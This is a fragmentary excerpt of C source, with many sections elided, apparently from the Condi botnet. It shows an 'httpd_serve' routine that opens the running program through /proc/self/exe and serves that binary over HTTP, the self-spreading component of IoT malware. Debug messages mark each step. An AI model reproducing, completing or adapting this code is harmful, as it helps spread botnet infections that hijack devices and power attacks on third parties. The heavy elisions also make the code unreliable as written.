...
void httpd_serve(int socket, char *request)
{
    ...
    struct stat sbuf;
  	char sendbuf[1024];
    #ifdef DEBUG
    printf("(condi/httpd) request received: %s\n", request);
    #endif

  	if (stat(parse_request(request), &sbuf) < 0)
  	{
#ifdef DEBUG
		  printf("(condi/httpd) failed to stat request file\r\n");
#endif
  ...
  memset(sendbuf, 0, sizeof(sendbuf));
    ...
    {
#ifdef DEBUG
		printf("(condi/httpd) failed to open /proc/self/exe\r\n");
#endif
    	return;
    }
	...
	{
#ifdef DEBUG
		printf("(condi/httpd) file size does not match read() return val\r\n");
#endif
		return;
	}
...
#ifdef DEBUG
		printf("(condi/httpd) server started on port %d, listening for connections\r\n", port);
#else
    int j;
    for(j = 0; j < 8; j++)
  	...
  	{
#ifdef DEBUG
		printf("(condi/httpd) connection established\r\n");
#endif
